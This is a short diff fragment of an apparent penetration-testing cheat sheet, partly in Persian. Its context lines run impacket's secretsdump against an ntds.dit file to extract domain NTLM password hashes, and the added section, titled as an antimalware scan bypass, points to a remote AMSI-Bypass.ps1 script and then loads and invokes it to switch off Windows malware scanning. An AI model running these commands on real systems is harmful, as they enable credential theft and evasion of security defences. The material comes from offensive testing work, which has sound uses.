@@ -1463,3 +1463,11 @@ enumprinters
 python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system -
 hashes lmhash:nthash LOCAL -output nt-hash
 ```
+
+## بایپس Antimalware Scan
+
+```text
+https://raw.githubusercontent.com/kmkz/Pentesting/master/AMSI-Bypass.ps1
+. .\AMSI-Bypass.ps1
+Invoke-AmsiBypass
+```
